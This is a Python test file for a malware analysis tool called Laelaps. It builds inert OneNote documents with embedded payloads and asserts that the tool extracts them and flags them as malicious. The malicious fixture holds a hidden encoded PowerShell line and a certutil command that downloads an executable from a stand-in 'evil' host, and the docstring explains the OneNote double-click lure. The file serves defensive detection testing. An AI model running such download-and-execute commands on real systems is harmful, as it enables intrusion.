#!/usr/bin/env python3
"""
Laelaps OneNote (.one) embedded-file extraction tests.

OneNote documents can embed arbitrary files; a lure image tells the victim to
double-click, which runs the embedded .bat/.vbs/.ps1/.exe. This was a dominant
initial-access vector in 2023-2024. These build inert OneNote documents (valid
MS-ONESTORE FileDataStoreObject structure, but the "payload" is an EICAR-style
recognition fixture) and assert Laelaps extracts and flags them.

Fully offline. Run:  python3 tests/onenote_test.py
"""
import os
import struct
import sys
import tempfile

os.environ["LAELAPS_OFFLINE"] = "1"
os.environ.pop("ANTHROPIC_API_KEY", None)
os.environ.pop("OPENAI_API_KEY", None)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import laelaps as L  # noqa: E402

checks = []


def check(name, cond, extra=""):
    ok = bool(cond)
    checks.append(ok)
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}{(' -> ' + extra) if extra and not ok else ''}")


HDR = bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac")   # FileDataStoreObject header GUID
FTR = bytes.fromhex("22a7fb71790f0b4abb138992564 26b24".replace(" ", ""))  # footer GUID
SEC = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3")   # .one section magic GUID


def fdso(payload):
    body = HDR + struct.pack("<Q", len(payload)) + b"\x00" * 12 + payload
    return body + b"\x00" * ((-len(body)) % 8) + FTR


def onenote(*payloads):
    out = SEC + b"\x00" * 64
    for p in payloads:
        out += fdso(p)
    return out


tmp = tempfile.mkdtemp(prefix="laelaps_one_")

print("=== malicious OneNote (embedded script + embedded exe) ===")
mal = onenote(
    b"@echo off\r\npowershell -w hidden -enc SQBFAFgA\r\ncertutil -urlcache -f http://evil/x.exe\r\n",
    b"MZ\x90\x00 this program cannot be run in DOS mode. embedded payload")
mp = os.path.join(tmp, "Invoice.one")
open(mp, "wb").write(mal)
rep = L.analyze_file_v2(mp, use_llm=False)
one_sigs = [s.title for s in rep.signals if s.engine == "deep:onenote"]
check("detected as a OneNote document", "OneNote" in rep.filetype, rep.filetype)
check("verdict is malicious or suspicious", rep.verdict in ("malicious", "suspicious"), rep.verdict)
check("embedded executable flagged", any("Windows executable" in t for t in one_sigs))
check("embedded script flagged", any("script payload" in t for t in one_sigs))
check("MITRE includes user-execution", "T1204.002" in rep.mitre, str(rep.mitre))

print("=== detection by magic even without a .one extension ===")
disguised = os.path.join(tmp, "document.dat")
open(disguised, "wb").write(mal)
check("magic-detected OneNote regardless of extension",
      "OneNote" in L.analyze_file_v2(disguised, use_llm=False).filetype)

print("=== OneNote with only a benign embedded file ===")
benign_doc = onenote(b"\x89PNG\r\n\x1a\n just a harmless picture, no scripts here")
benign_embed = os.path.join(tmp, "Recipes.one")
open(benign_embed, "wb").write(benign_doc)
# the presence indicator is medium (informational context), so check the analyzer directly
btitles = [i.title for i in L.analyze_onenote(benign_doc)]
check("embedded-file presence noted", any("embedded file" in t for t in btitles), str(btitles))
check("benign embed not flagged as exe/script",
      not any(("executable" in t or "script payload" in t) for t in btitles))
check("benign embed is not malicious", L.analyze_file_v2(benign_embed, use_llm=False).verdict != "malicious")

print("=== OneNote with no embedded files stays clean ===")
empty = os.path.join(tmp, "Notes.one")
open(empty, "wb").write(SEC + b"\x00" * 400)
repe = L.analyze_file_v2(empty, use_llm=False)
check("empty OneNote is clean", repe.verdict == "clean", repe.verdict)

print("=== analyze_onenote unit behavior ===")
check("analyze_onenote returns >=2 indicators for the malicious doc", len(L.analyze_onenote(mal)) >= 2)
check("analyze_onenote returns nothing for non-OneNote bytes", L.analyze_onenote(b"not onenote") == [])

passed, total = sum(checks), len(checks)
print(f"\n=== {passed}/{total} checks passed ===")
sys.exit(0 if passed == total else 1)
